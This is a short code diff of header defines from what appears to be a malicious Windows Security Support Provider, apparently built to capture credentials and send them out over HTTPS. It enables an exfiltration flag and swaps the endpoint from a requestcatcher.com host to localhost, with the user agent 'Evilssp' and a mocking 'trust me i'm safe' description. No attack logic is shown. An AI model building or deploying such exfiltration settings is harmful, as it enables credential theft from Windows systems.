@@ -12,8 +12,8 @@
 #include "https.h"
 
 #define HTTPS_EXFILTRATION 1
-#define HTTPS_ENDPOINT L"chevalo.requestcatcher.com"
-#define USERAGENT L"WinHTTP Example/1.0"
+#define HTTPS_ENDPOINT L"127.0.0.1"
+#define USERAGENT L"Evilssp"
 
 #define SSP_NAME L"chevalo"
 #define SSP_COMMENT L"chevalo trust me i'm safe"
@@ -24,4 +24,4 @@
 
 
 #define SIZE_CHUNK 63
-#define BUFFER_SIZE 512
+#define BUFFER_SIZE 4096
